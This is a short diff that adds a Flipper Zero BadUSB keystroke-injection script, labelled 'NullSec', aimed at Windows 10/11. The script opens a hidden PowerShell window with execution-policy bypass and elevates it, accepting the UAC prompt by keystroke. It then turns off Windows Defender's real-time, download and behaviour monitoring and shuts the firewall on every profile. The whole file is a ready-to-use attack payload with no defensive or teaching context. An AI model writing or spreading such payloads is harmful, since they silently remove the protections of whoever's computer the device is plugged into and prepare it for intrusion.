@@ -1,0 +1,13 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Disable Windows Defender
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; netsh advfirewall set allprofiles state off"'
+ENTER
+DELAY 2000
+ALT y
+ENTER
